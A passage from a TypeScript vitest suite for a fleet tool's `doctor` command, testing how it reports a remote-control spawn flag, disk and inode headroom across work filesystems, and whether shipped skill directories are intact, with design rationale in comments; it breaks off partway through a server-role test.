// `ccrc doctor`, part: fleet (D-6767). The doctor suite was one 17,000-line file that held a worker for 661 s; its describe blocks moved
// here unchanged, and the fixtures they share are in `ccrc-doctorFixture.ts`.
import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { writeFileSync, readFileSync, mkdirSync, symlinkSync, rmSync, chmodSync, existsSync, cpSync, openSync, writeSync, ftruncateSync, closeSync } from 'node:fs';
import path, { join } from 'node:path';
import { mkTmp, removeTmpFixturesEachTest } from './tmpHelpers.js';
import { ghContainedEnv, seedAccountsSh } from './ccdWsHelpers.js';
import { ccrcContainedEnv } from './ccrcContainment.js';
import { POOLED_TEST_ROSTER } from './fixtures/poolRule.js';
import { generateWrapperBody } from '../../shared/wrapper.mjs';
import { markGenerated } from '../../shared/mark.mjs';
import { installDoctorHooks, here, REPO, CCRC_SRC, CHECKS_SRC, LIB_SRC, BASH, installCcrc, writeChecks, stub, unstubManager, unstub, linkReal, stubNodeRosterExit, RosterEntry, UPSTREAM, writeRoster, writeRawRoster, entry, rawRoster, UP_JSON, binDir, writeWrapper, writeBinary, writeSymlinkWrapper, shq, ghStub, Health, FIXTURE_ADDR, stubHealth, stubHealthUnreachable, HEALTHY_SHA, stubBuildHealth, healthBodyFor, curlCalls, writeCcrcEnv, writeRcFlag, stubSystemctl, writeUnitFile, removeUnitFile, stubDf, DfRow, stubDfMap, CANARY_TOKEN, EXPOSED_HOST, writeExposureEnv, endDateFixture, writeSessions, sysCaddyfile, runDoctor, healthy, itCodex, healthyCodexBox, broken, tableNames, lineFor, HEALTHY_SKIPS, skipLineFor } from './ccrc-doctorFixture.js';

// Each case's homes go when the case ends, not in a file-wide end sweep (R100, review 518's S1): that sweep overran vitest's 20 s
// hook timeout on the one file this family was split from. Registered before `installDoctorHooks()`'s root `afterEach` (the codex
// lanes' process kill) because vitest runs after-hooks in reverse order of registration: that kill still sees its home.
removeTmpFixturesEachTest();
installDoctorHooks();

// ── what this box's sessions are spawned AS ───────────────────────────────
// Stage 2e, Task 2 (fix round 1). `~/.ccrc/remote-control` is the per-box
// switch `ccd`'s `_rc_enabled` reads on every spawn (D-99), and `rc` is a check
// OF ITS OWN in the table. It was first shipped as an append to
// `_check_config`'s two PASS details, which coupled a fact about SPAWN SHAPE to
// the health of an unrelated file: the readout vanished on four arms — the
// fleet-role SKIP and all three `ccrc.env` WARNs — so the reference fleet host,
// the one box in the topology that actually runs `on`, printed nothing about it
// while three shipped pointers told operators to look there. A standalone check
// is strictly smaller AND correct: it reads one file and answers about one
// thing.
//
// ALWAYS PASS, never WARN or FAIL. The state is a FACT, not a defect — both
// values are legitimate states for a box to be in, and a doctor that WARNed
// about `on` (or about `off`) would be asserting a preference it has no
// standing for. Even the two degraded forms are PASSes: they say what ccd will
// do, which is the question. This file's remedy contract makes that concrete —
// a WARN owes a remedy, and there is no remedy for "your box is configured the
// way you configured it".
//
// FIVE PRINTED FORMS OVER THREE SEMANTIC STATES, and the two extra forms are
// the point of having a helper at all:
//   on                        — this box publishes its sessions to claude.ai
//   off                       — a deliberate off, written by somebody
//   off (default)             — no file; ccd reads absent as off
//   off (unparseable …)       — a file whose first line is neither, INCLUDING
//                               the newline-less `on` that `read` rejects at
//                               EOF-before-delimiter. Reporting that as a
//                               deliberate `off` tells an operator they chose
//                               a mode when their edit simply did not take.
//   off (unreadable …)        — the file is there and nothing came out of it.
//                               A mode problem and a bytes problem are two
//                               different mornings; `_check_config` splits the
//                               same pair for `ccrc.env` two screens up.
//
// MUTATIONS MEASURED (applied to the shipped helper, run, reverted): recorded
// beside the implementation in this task's report.
describe('ccrc doctor: rc — the state this box spawns its sessions in', () => {
  const rcLine = (home: string): string => lineFor(runDoctor(home).stdout, 'rc') ?? '';

  it('is a check of its own, and it answers on a FLEET-ROLE box — where config SKIPs', () => {
    // THE FINDING THIS CHECK EXISTS FOR (fix round 1, Important). The state was
    // first appended to `_check_config`'s two PASS details, which made a fact
    // about SPAWN SHAPE conditional on the health of `ccrc.env` — a file the
    // fleet host does not have at all (D-86's topology branch SKIPs it). So on
    // the reference fleet, the ONE box that runs `on`, doctor said nothing
    // about RC while `ccd`, `ccrc-doctor-checks` and the README all pointed
    // operators at a line that was not printed there.
    //
    // The fixture is that box: agent unit, no `ccrc.env`, flag `on`.
    const home = healthy('ccrc-doctor-rc-fleetrole-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    removeUnitFile(home, 'ccrc.service');
    writeUnitFile(home, 'ccrc-agent.service');
    writeFileSync(join(home, 'fixture-unit-ccrc-agent.service'), 'active\n');
    writeRcFlag(home, 'on\n');
    const r = runDoctor(home);
    expect(r.stdout, r.stdout).toMatch(/^PASS rc: on$/m);
    // …and `config` still SKIPs on that box, unchanged: the two checks are
    // independent now, which is the whole point.
    expect(r.stdout).toMatch(/^SKIP config: /m);
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) config: /m);
  });

  it('answers when ccrc.env is UNREADABLE too — the two files are unrelated', () => {
    // The other three silent arms were the `ccrc.env` WARNs. A chmod-000
    // `ccrc.env` says nothing whatsoever about how sessions spawn, and it used
    // to take the RC readout down with it.
    const home = healthy('ccrc-doctor-rc-envwarn-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    writeRcFlag(home, 'on\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN config: .*defaults apply/m);
    expect(r.stdout).toMatch(/^PASS rc: on$/m);
  });

  it('says "off (default)" on a box with no flag file — absent is what ccd reads as off', () => {
    const home = healthy('ccrc-doctor-rc-absent-');
    expect(rcLine(home)).toBe('PASS rc: off (default)');
  });

  it('says "on" for a box that drives its sessions over the RC socket', () => {
    const home = healthy('ccrc-doctor-rc-on-');
    writeRcFlag(home, 'on\n');
    expect(rcLine(home)).toBe('PASS rc: on');
  });

  it('says "off" for a deliberate off, and does not dress it as the default', () => {
    // The two are different facts about the box — "nobody has decided" and
    // "somebody decided no" — and an operator reading a transcript acts on
    // them differently (one is a file to write, the other a file to edit).
    const home = healthy('ccrc-doctor-rc-off-');
    writeRcFlag(home, 'off\n');
    expect(rcLine(home)).toBe('PASS rc: off');
  });

  it('says "unparseable" for a first line that is neither — never a deliberate off', () => {
    const home = healthy('ccrc-doctor-rc-garbage-');
    writeRcFlag(home, 'yes please\n');
    expect(rcLine(home)).toBe(
      "PASS rc: off (unparseable — the file must hold one line reading 'on' or 'off')");
  });

  it('says "unparseable" for a newline-less `on` — the operator edit that did not take', () => {
    // THE CASE THE THIRD FORM EXISTS FOR, and it is not hypothetical: `printf
    // 'on' > ~/.ccrc/remote-control` is what a person types. `read` returns
    // non-zero at EOF-before-delimiter, so ccd reads those bytes as OFF, and a
    // doctor that printed a bare `off` would be telling the operator they had
    // chosen the mode their edit failed to reach. Both writers in this repo
    // end the line for exactly this reason.
    const home = healthy('ccrc-doctor-rc-nonewline-');
    writeRcFlag(home, 'on');
    expect(rcLine(home)).toMatch(/^PASS rc: off \(unparseable — /);
  });

  it('says "unparseable" for an EMPTY file — the other side of the D-100 split', () => {
    // The row D-100's whole argument turns on (review Minor 5): an empty file
    // is READABLE, so it must not report as a permissions problem. Both sides
    // of the split are asserted now — this one and the unreadable case below —
    // because a deviation that exists to keep two conditions apart is only
    // held by tests that pin BOTH of them.
    const home = healthy('ccrc-doctor-rc-empty-');
    writeRcFlag(home, '');
    expect(rcLine(home)).toMatch(/^PASS rc: off \(unparseable — /);
  });

  it.skipIf(process.getuid?.() === 0)(
    'says "unreadable" for a flag file it cannot open — a mode problem is not a bytes problem', () => {
      const home = healthy('ccrc-doctor-rc-unreadable-');
      writeRcFlag(home, 'on\n');
      chmodSync(join(home, '.ccrc', 'remote-control'), 0o000);
      const r = runDoctor(home);
      expect(lineFor(r.stdout, 'rc') ?? '').toMatch(/^PASS rc: off \(unreadable — /);
      // …and bash does not diagnose it on stderr, for `_rc_enabled`'s own
      // measured reason: the redirect is attempted with stderr already
      // suppressed, not after.
      expect(r.stderr).toBe('');
    });

  it('never WARNs and never FAILs — the state is a fact, and a WARN owes a remedy', () => {
    // Every one of the five forms, including the two degraded ones, through the
    // PASS class. A check that WARNed here would be asserting a preference
    // about how somebody should run their box, and would owe a remedy line
    // this file's contract has no sentence for.
    for (const [what, bytes] of [
      ['on', 'on\n'], ['off', 'off\n'], ['garbage', 'zzz\n'], ['empty', ''],
    ] as const) {
      const home = healthy(`ccrc-doctor-rc-alwayspass-${what}-`);
      writeRcFlag(home, bytes);
      const out = runDoctor(home).stdout;
      expect(out, what).toMatch(/^PASS rc: /m);
      expect(out, what).not.toMatch(/^(WARN|FAIL) rc: /m);
    }
  });

  it('leaves `config` carrying nothing about it — the fact has one home', () => {
    // The append is GONE, both arms. Two surfaces reporting one fact is how
    // they come to disagree, and `_check_config`'s detail is a statement about
    // `ccrc.env` again.
    const home = healthy('ccrc-doctor-rc-config-clean-');
    writeRcFlag(home, 'on\n');
    const out = runDoctor(home).stdout;
    const config = lineFor(out, 'config') ?? '';
    expect(config).toMatch(/^PASS config: /);
    expect(config).not.toContain('remote-control');
  });
});


// ── room on the filesystem $HOME is on ────────────────────────────────────
// Stage 2d, Task 2. Spec §5 asks for "disk headroom (including the backup
// dir)": a ccd workspace is a full clone, `~/.ccrc/coord.db` is a WAL database
// with no backup to fall back on (server/src/coord/db.ts:144-145), and every
// deploy copies the shipped tree under `~/ccrc-backups/<ts>/` (deploy.sh:33-34).
// All three land on one filesystem, and all three fail in unhelpful ways when
// it is full.
//
// MUTATIONS MEASURED (applied to the shipped check, run, reverted):
//   - the ''/non-digit guard deleted -> RED, "warns when df answers something
//     it cannot read…", `to match /^WARN disk: /` (the empty Available field
//     goes into `$(( ))` instead).
//   - the 2 GiB FAIL floor deleted -> RED, "fails under the 2 GiB floor".
//   - the 10 GiB WARN floor deleted -> RED, "warns between the floor and 10
//     GiB…" (a tight box reporting a clean PASS).

describe('ccrc doctor: disk', () => {
  const GIB = 1024 * 1024;                          // in the KiB `df -Pk` reports

  it('fails under the 2 GiB floor', () => {
    const home = healthy('ccrc-doctor-disk-full-');
    stubDf(home, GIB);                              // 1 GiB
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL disk: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('1024 MiB free');     // MiB, because "1 GiB" and "0 GiB" are the whole range below the floor
    expect(lines[i + 1]).toMatch(/^ {2}remedy: free space on \//);
    expect(runDoctor(home).code).toBe(1);
  });

  it('warns between the floor and 10 GiB, and names the backup directory to clear', () => {
    const home = healthy('ccrc-doctor-disk-tight-');
    stubDf(home, 5 * GIB);
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN disk: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('5 GiB free');
    expect(lines[i]).toContain('getting tight');
    expect(lines[i + 1]).toContain('~/ccrc-backups');
    expect(runDoctor(home).code).toBe(0);
  });

  it('passes naming the room it measured', () => {
    const home = healthy('ccrc-doctor-disk-ok-');
    expect(lineFor(runDoctor(home).stdout, 'disk'))
      .toMatch(/^PASS disk: 41 GiB free on \/ \(.*home.*\), /);
  });

  it('asks df for KiB and for inodes, about $HOME among the roots, and never with -h', () => {
    // `-P` because the default output wraps a long device name onto its own
    // line (and the parse takes the LAST line); `-k` because every threshold
    // here is in KiB. `df -h` would answer "41G" and the arithmetic below would
    // be nonsense.
    const home = healthy('ccrc-doctor-disk-argv-');
    runDoctor(home);
    const calls = readFileSync(join(home, 'df-calls'), 'utf8').split('\n').filter(Boolean);
    expect(calls).toContain(`-Pk ${home}`);
    expect(calls).toContain(`-Pi ${home}`);
    for (const c of calls) expect(c).toMatch(/^-P[ki] \//);
  });

  it('warns, rather than measuring nothing silently, when df is not installed', () => {
    const home = healthy('ccrc-doctor-disk-nodf-');
    unstub(home, 'df');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN disk: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('cannot measure free space');
    expect(lines[i + 1]).toMatch(/coreutils|util-linux/);
    expect(runDoctor(home).code).toBe(0);
  });

  it('warns when df answers something it cannot read, rather than reporting a number nobody measured', () => {
    // A df that exits nonzero printing nothing (a stale mount) used to arrive
    // as an empty Available field — and `$(( / 1048576 ))` over an empty string
    // is a bash arithmetic error, on stderr, in a check that then claims 0 GiB.
    const home = healthy('ccrc-doctor-disk-unreadable-');
    stubDf(home);
    writeFileSync(join(home, 'fixture-df-exit'), '1\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN disk: /m);
    // The load-bearing half: the line says the measurement did NOT happen,
    // rather than reporting the 0 an empty field arithmetics into.
    expect(r.stdout).toMatch(/free space was never measured/);
    expect(r.stdout).not.toMatch(/^(PASS|FAIL) disk: /m);
    expect(r.stdout).not.toMatch(/0 GiB|0 MiB/);
    expect(r.stderr).toBe('');
    expect(r.code).toBe(0);
  });
});


// D-6618 (plan Task DR-6; spec §2.5.2): doctor measures EVERY work filesystem, one line each, not only $HOME's.
describe('ccrc doctor: disk, every work filesystem', () => {
  const GIB = 1024 * 1024;                          // in the KiB `df -Pk` reports
  const diskLines = (out: string): string[] => out.split('\n').filter((l) => /^(PASS|WARN|FAIL) disk: /.test(l));
  /** $HOME on the root filesystem, `projects` and `worktrees` on a second one. */
  const twoFs = (home: string, work: Partial<DfRow>, root: Partial<DfRow> = {}): void => {
    mkdirSync(join(home, 'projects'), { recursive: true });
    mkdirSync(join(home, 'worktrees'), { recursive: true });
    stubDfMap(home, [
      { prefix: join(home, 'projects'), mount: '/mnt/work', sizeKiB: 100 * GIB, usedKiB: 50 * GIB, availKiB: 50 * GIB, ...work },
      { prefix: join(home, 'worktrees'), mount: '/mnt/work', sizeKiB: 100 * GIB, usedKiB: 50 * GIB, availKiB: 50 * GIB, ...work },
      { prefix: '*', mount: '/', sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 90 * GIB, ...root },
    ]);
  };

  it('two roots on one filesystem print one line naming both', () => {
    const home = healthy('ccrc-doctor-disk-one-line-');
    twoFs(home, {});
    const lines = diskLines(runDoctor(home).stdout);
    const work = lines.filter((l) => l.includes('/mnt/work'));
    expect(work, lines.join('\n')).toHaveLength(1);
    expect(work[0]).toContain('projects');
    expect(work[0]).toContain('worktrees');
    expect(lines.filter((l) => l.includes(' on / '))).toHaveLength(1);
  });

  it('a work root on a second filesystem at 93% is FAIL even when $HOME is at 10%', () => {
    const home = healthy('ccrc-doctor-disk-second-fs-');
    twoFs(home, { usedKiB: 93 * GIB, availKiB: 7 * GIB });
    const r = runDoctor(home);
    const lines = diskLines(r.stdout);
    expect(lines.find((l) => l.includes('/mnt/work')), lines.join('\n')).toMatch(/^FAIL disk: /);
    expect(lines.find((l) => l.includes(' on / '))).toMatch(/^PASS disk: /);
    expect(r.code).toBe(1);
  });

  it('92% of bytes is FAIL and 85% is WARN, at the edges', () => {
    const at = (usedPct: number): string => {
      const home = healthy('ccrc-doctor-disk-pct-');
      twoFs(home, { sizeKiB: 1000 * GIB, usedKiB: usedPct * 10 * GIB, availKiB: (100 - usedPct) * 10 * GIB });
      return diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work')) ?? '';
    };
    expect(at(91)).toMatch(/^WARN disk: /);
    expect(at(92)).toMatch(/^FAIL disk: /);
    expect(at(84)).toMatch(/^PASS disk: /);
    expect(at(85)).toMatch(/^WARN disk: /);
  });

  it('inodes at 90% are WARN, and at 92% FAIL, while bytes are at 10%', () => {
    const home = healthy('ccrc-doctor-disk-inodes-');
    twoFs(home, { usedKiB: 10 * GIB, availKiB: 90 * GIB, inodes: 1_000_000, iused: 900_000 });
    const line = diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work')) ?? '';
    expect(line).toMatch(/^WARN disk: /);
    expect(line).toContain('inodes');
    const home2 = healthy('ccrc-doctor-disk-inodes-fail-');
    twoFs(home2, { usedKiB: 10 * GIB, availKiB: 90 * GIB, inodes: 1_000_000, iused: 920_000 });
    expect(diskLines(runDoctor(home2).stdout).find((l) => l.includes('/mnt/work'))).toMatch(/^FAIL disk: /);
  });

  it('under 2 GiB free on a second filesystem is FAIL and under 10 GiB is WARN, whatever the percent', () => {
    const home = healthy('ccrc-doctor-disk-floor-');
    twoFs(home, { sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 1 * GIB });
    expect(diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work'))).toMatch(/^FAIL disk: .*1024 MiB free/);
    const home2 = healthy('ccrc-doctor-disk-floor-warn-');
    twoFs(home2, { sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 5 * GIB });
    expect(diskLines(runDoctor(home2).stdout).find((l) => l.includes('/mnt/work'))).toMatch(/^WARN disk: .*5 GiB free/);
  });

  it('an unreadable df line is WARN, never PASS', () => {
    const home = healthy('ccrc-doctor-disk-garbled-');
    twoFs(home, { mount: 'garbled' });
    const r = runDoctor(home);
    const lines = diskLines(r.stdout);
    const bad = lines.find((l) => l.includes('projects')) ?? '';
    expect(bad, lines.join('\n')).toMatch(/^WARN disk: .*never measured/);
    expect(r.stdout).not.toMatch(/^PASS disk: .*projects/m);
    expect(r.code).toBe(0);
  });

  it('prints the measured percent past the FAIL line, never the threshold', () => {
    const home = healthy('ccrc-doctor-disk-99pct-');
    twoFs(home, { sizeKiB: 100 * GIB, usedKiB: 99 * GIB, availKiB: 1 * GIB, inodes: 1_000_000, iused: 980_000 });
    const line = diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work')) ?? '';
    expect(line).toMatch(/^FAIL disk: /);
    expect(line).toContain('99% of bytes');
    expect(line).toContain('98% of inodes');
  });

  it.skipIf(process.getuid?.() === 0)('a root under an unsearchable parent is WARN naming it, never an all-PASS', () => {
    const home = healthy('ccrc-doctor-disk-unstatable-');
    const locked = join(home, 'locked');
    mkdirSync(join(locked, 'cfg'), { recursive: true });
    writeFileSync(join(home, '.ccrc', 'accounts.sh'), `CCRC_ACCOUNTS=(lane-a)\n_ccrc_cfg_dir() { echo "${locked}/cfg"; }\n`);
    chmodSync(locked, 0o000);
    try {
      const r = runDoctor(home);
      const lines = diskLines(r.stdout);
      const warn = lines.find((l) => l.startsWith('WARN disk: ')) ?? '';
      expect(warn, lines.join('\n')).toContain('config-dirs');
      expect(warn).toContain(`${locked}/cfg`);
      expect(warn).toContain('never measured');
    } finally {
      chmodSync(locked, 0o755);
    }
  });

  it('a config dir from the roster is measured with its own filesystem', () => {
    const home = healthy('ccrc-doctor-disk-config-dir-');
    mkdirSync(join(home, '.claude-a'), { recursive: true });
    writeFileSync(join(home, '.ccrc', 'accounts.sh'), 'CCRC_ACCOUNTS=(lane-a)\n_ccrc_cfg_dir() { echo "$HOME/.claude-a"; }\n');
    stubDfMap(home, [
      { prefix: join(home, '.claude-a'), mount: '/mnt/cfg', sizeKiB: 100 * GIB, usedKiB: 95 * GIB, availKiB: 5 * GIB },
      { prefix: '*', mount: '/', sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 90 * GIB },
    ]);
    const line = diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/cfg')) ?? '';
    expect(line).toMatch(/^FAIL disk: /);
    expect(line).toContain('config-dirs');
  });

  it.each([
    ['fails to source', 'return 1\n'],
    ['lacks _ccrc_cfg_dir', 'CCRC_ACCOUNTS=(lane-a)\n'],
  ])('a roster projection that %s is a WARN naming config-dirs, never a silent PASS', (_n, body) => {
    const home = healthy('ccrc-doctor-disk-config-broken-');
    mkdirSync(join(home, '.claude-a'), { recursive: true });
    writeFileSync(join(home, '.ccrc', 'accounts.sh'), body);
    stubDfMap(home, [
      { prefix: join(home, '.claude-a'), mount: '/mnt/cfg', sizeKiB: 100 * GIB, usedKiB: 99 * GIB, availKiB: 1 * GIB },
      { prefix: '*', mount: '/', sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 90 * GIB },
    ]);
    const lines = diskLines(runDoctor(home).stdout);
    expect(lines.find((l) => l.includes('config-dirs')), lines.join('\n')).toMatch(/^WARN disk: .*roster projection unreadable/);
  });
});


// D-6618 (plan Task DR-6) characterization: the three verdicts on $HOME's filesystem at their edges, green on the
// check as it stood before it measured every work filesystem. They stay true after: the floors did not move.
describe('ccrc doctor: disk, the $HOME verdicts at their edges', () => {
  const GIB = 1024 * 1024;

  it('exactly 2 GiB free is a WARN, not a FAIL', () => {
    const home = healthy('ccrc-doctor-disk-edge2-');
    stubDf(home, 2 * GIB);
    expect(lineFor(runDoctor(home).stdout, 'disk')).toMatch(/^WARN disk: 2 GiB free/);
  });

  it('exactly 10 GiB free is a PASS', () => {
    const home = healthy('ccrc-doctor-disk-edge10-');
    stubDf(home, 10 * GIB);
    expect(lineFor(runDoctor(home).stdout, 'disk')).toMatch(/^PASS disk: 10 GiB free/);
  });
});


describe('ccrc doctor: skills — every home carries the SHIPPED skills (release/rollout design §6)', () => {
  const installed = (home: string, suffix: string, name: string): string => join(home, suffix, 'skills', name);

  it('passes on the healthy box, counting homes', () => {
    const home = healthy('ccrc-doctor-skills-pass-');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills: 1\/1 homes carry the shipped ccrc-coordinator, ccrc-worker, ccrc-reviewer and ccrc-history$/m);
  });

  it('fails on ONE edited byte in ONE home, naming the account and the skill, and the installer runs it green again', () => {
    const home = healthy('ccrc-doctor-skills-stale-');
    const f = join(installed(home, '.claude', 'ccrc-reviewer'), 'SKILL.md');
    writeFileSync(f, readFileSync(f, 'utf8').replace('$HOME/.cc-clips/', '$WT/.ccrc-review/'));   // the 2026-09-17 clause, put back
    let r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes differ from the shipped tree or are missing from their home: claude: ccrc-reviewer differs$/m);
    expect(r.stdout).toMatch(/remedy: run 'ccrc doctor --fix' .*, or 'ccrc update'/);
    // R10: the remedy's second arm must converge from the TREE the check
    // measured ($HOME/ccrc/ccd/reviewer-skill, i.e. installCcrc's planted
    // BOX_TREE_DIR copy), not the .cc-sessions placed copy — that copy was
    // stale on 2026-09-17. Pin the printed remedy names that seam.
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/reviewer-skill"/);
    // R12: BOTH halves come out of the measured tree — the source AND the
    // script. The remedy used to name `$HOME/.cc-sessions/install-*.sh`,
    // the other copy that was stale on 2026-09-17.
    expect(r.stdout).toMatch(/bash "\$HOME\/ccrc\/ccd\/install-reviewer-skill\.sh"/);
    // The remedy works — and it is EXACTLY the printed command that is run,
    // resolved on this fixture's box: `$HOME/ccrc/ccd/install-reviewer-skill.sh`
    // is join(home,'ccrc','ccd','install-reviewer-skill.sh') and
    // `$HOME/ccrc/ccd/reviewer-skill` is join(home,'ccrc','ccd','reviewer-skill'),
    // both installCcrc's planted tree. Invoking the REPO's copy instead (what
    // this case did before) would have stayed green with a remedy naming a
    // script the box does not have. Contained through `ghContainedEnv` like
    // every other spawn in this suite.
    const rem = spawnSync(BASH,
      [join(home, 'ccrc', 'ccd', 'install-reviewer-skill.sh'), '--homes', join(home, '.claude')],
      {
        env: ghContainedEnv(home, {
          ...process.env, HOME: home,
          CCRC_SKILL_SRC: join(home, 'ccrc', 'ccd', 'reviewer-skill'),
        }),
        encoding: 'utf8',
      });
    expect(rem.status, `${rem.stdout}${rem.stderr}`).toBe(0);
    r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills:/m);
  });

  it('reports ccrc-history stale when it differs, and its printed remedy runs it green again (history spec §8.9 C23)', () => {
    const home = healthy('ccrc-doctor-skills-history-stale-');
    const f = join(installed(home, '.claude', 'ccrc-history'), 'SKILL.md');
    const shipped = readFileSync(f, 'utf8');
    // An older wording a home could still carry: the literal path every command is pinned to, put back to the
    // bare word.
    writeFileSync(f, shipped.replace('"$HOME/.local/bin/ccrc" history', 'ccrc history'));
    expect(readFileSync(f, 'utf8'), 'the fixture edit changed nothing').not.toBe(shipped);
    let r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes differ from the shipped tree or are missing from their home: claude: ccrc-history differs$/m);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/history-skill" bash "\$HOME\/ccrc\/ccd\/install-history-skill\.sh"/);
    // The printed command, resolved on this fixture's box: installCcrc's planted tree is `$HOME/ccrc/ccd`.
    const rem = spawnSync(BASH,
      [join(home, 'ccrc', 'ccd', 'install-history-skill.sh'), '--homes', join(home, '.claude')],
      {
        env: ghContainedEnv(home, {
          ...process.env, HOME: home,
          CCRC_SKILL_SRC: join(home, 'ccrc', 'ccd', 'history-skill'),
        }),
        encoding: 'utf8',
      });
    expect(rem.status, `${rem.stdout}${rem.stderr}`).toBe(0);
    expect(readFileSync(f, 'utf8')).toBe(shipped);
    r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills: 1\/1 homes carry the shipped ccrc-coordinator, ccrc-worker, ccrc-reviewer and ccrc-history$/m);
  }, 90_000);   // two doctor runs: a bounded but load-slow box is not a red

  it('a home whose ccrc-history lacks only its MIT sidecar is stale too: diff -r -q compares the whole tree', () => {
    const home = healthy('ccrc-doctor-skills-history-sidecar-');
    rmSync(join(installed(home, '.claude', 'ccrc-history'), 'LICENSE.lossless-claw'));
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes .*: claude: ccrc-history differs$/m);
  });

  it('the remedy names the override seam, not the bare installer (R10)', () => {
    // Mutation pin: a remedy that reverted to bare installer invocations
    // (no CCRC_SKILL_SRC) would converge from $HOME/.cc-sessions instead of
    // the measured tree — silently wrong when .cc-sessions is stale. This
    // case reds if that override is dropped from the printed remedy.
    const home = healthy('ccrc-doctor-skills-remedy-seam-');
    const f = join(installed(home, '.claude', 'ccrc-reviewer'), 'SKILL.md');
    writeFileSync(f, readFileSync(f, 'utf8').replace('$HOME/.cc-clips/', '$WT/.ccrc-review/'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/coordinator-skill"/);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/worker-skill"/);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/reviewer-skill"/);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/history-skill"/);
    // R12, the other half: the SCRIPT comes from the measured tree too, and
    // the remedy no longer sends the operator to `$HOME/.cc-sessions` for it.
    for (const role of ['coordinator', 'worker', 'reviewer', 'history']) {
      expect(r.stdout).toMatch(new RegExp(`bash "\\$HOME/ccrc/ccd/install-${role}-skill\\.sh"`));
    }
    expect(r.stdout).not.toMatch(/\.cc-sessions\/install-/);
  });

  it('a missing skill directory is a FAIL in its own words', () => {
    const home = healthy('ccrc-doctor-skills-missing-');
    rmSync(installed(home, '.claude', 'ccrc-worker'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: .*claude: ccrc-worker missing/m);
    // The headline says the condition the entry says: every entry here is
    // `missing`, and a headline that only knew how to say "differ" sent the
    // operator looking for a diff that does not exist.
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes differ from the shipped tree or are missing from their home:/m);
  });

  it('a second rostered home is measured too, and its config dir comes from configDirSuffix', () => {
    const home = healthy('ccrc-doctor-skills-two-');
    writeBinary(home, 'acct-a');
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    mkdirSync(join(home, '.acct-a', 'skills'), { recursive: true });
    let r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: 4 skill\(s\) in the rostered homes differ .*acct-a: ccrc-coordinator missing.*acct-a: ccrc-worker missing.*acct-a: ccrc-reviewer missing.*acct-a: ccrc-history missing/m);
    for (const [tree, name] of [['coordinator-skill', 'ccrc-coordinator'], ['worker-skill', 'ccrc-worker'], ['reviewer-skill', 'ccrc-reviewer'], ['history-skill', 'ccrc-history']] as const) {
      cpSync(join(REPO, 'ccd', tree), installed(home, '.acct-a', name), { recursive: true });
    }
    r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills: 2\/2 homes/m);
  });

  it('skips on a server-role box — it hosts no sessions', () => {
    const home = healthy('ccrc-doctor-skills-server-');
    writeCcrcEnv(home, ['CCRC_ROLE=server', 'CCRC_FLEET=local', 'CCRC_HOST=ccrc-fixture.invalid', 'CCRC_PORT=7788', ''].join('\n'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP skills: this box records CCRC_ROLE=server/m);
  });

  it('a server-role box skips EVERY per-account check the installer no longer converges there (D-3111)', () => {
    // The installer and the doctor say the same thing about a server-role box:
    // it hosts no sessions, so wrappers, credentials, agent-home memory, lane
    // settings and pool markers are nobody's concern there — a server box's
    // `ccrc update` (which ends with doctor) must not exit 1 over launchers
    // and homes ccrc does not manage on it.
    const home = healthy('ccrc-doctor-server-skips-');
    writeCcrcEnv(home, ['CCRC_ROLE=server', 'CCRC_FLEET=local', 'CCRC_HOST=ccrc-fixture.invalid', 'CCRC_PORT=7788', ''].join('\n'));
    const r = runDoctor(home);
